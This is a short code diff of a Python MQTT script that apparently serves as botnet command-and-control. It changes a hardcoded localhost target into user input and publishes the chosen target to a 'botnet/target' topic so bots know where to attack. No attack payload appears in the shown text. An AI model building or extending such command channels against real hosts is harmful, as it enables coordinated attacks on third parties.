@@ -6,7 +6,7 @@ port=1883
 #target=input("Target: ") #attack direction
 #create function for callback
 nodeId=-200
-target="127.0.0.1:8000"
+target=input("Target: ")   #http://localhost:8000
 lastId=3
 heartbeat=str(target)+" "+str(lastId)
 def on_publish(client,userdata,result): 
@@ -27,5 +27,5 @@ client.connect(broker,port)
 #ret= client1.publish("botnet/target",target)
 #print(ret)
 
-ret= client.publish("botnet/heartbeat",heartbeat)
+ret= client.publish("botnet/target",heartbeat)
 print(ret)
